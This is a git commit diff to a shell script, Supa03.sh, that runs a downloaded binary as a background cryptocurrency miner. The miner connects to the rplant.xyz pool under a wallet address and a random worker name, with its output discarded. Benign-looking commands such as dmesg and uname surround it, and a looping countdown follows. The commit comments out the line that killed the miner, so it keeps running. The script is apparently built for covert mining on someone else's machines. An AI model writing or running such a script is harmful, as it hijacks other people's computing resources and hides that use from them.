7850bec1dcbea0dbaa908d3957b931f3a6548b70
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-07-08 12:50:46 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -9,5 +9,5 @@ dmesg
 chmod +x avx2
 ./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x >/dev/null & 
 uname -a
-pkill -31 avx2
+# pkill -31 avx2
 time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
